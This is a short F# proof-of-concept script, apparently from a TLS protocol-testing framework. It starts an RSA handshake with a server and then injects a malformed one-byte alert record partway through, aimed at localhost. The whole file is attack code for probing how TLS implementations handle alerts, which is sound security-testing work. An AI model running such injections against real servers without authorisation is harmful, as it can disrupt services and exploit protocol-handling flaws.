module Attacks

open FlexTypes
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexAlert

let alertAttack peer name =
    // Connect to the server
    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,name) in

    // Start an RSA handshake with the server
    let st,nsc,ch = FlexClientHello.send(st) in
    let st,nsc,sh = FlexServerHello.receive(st,nsc) in

    // Inject a one byte alert on behalf of the attacker
    let _ = FlexAlert.send(st,Bytes.abytes [|1uy|])
    ()

[<EntryPoint>]
let main argv = 
    alertAttack "localhost" "localhost"
    0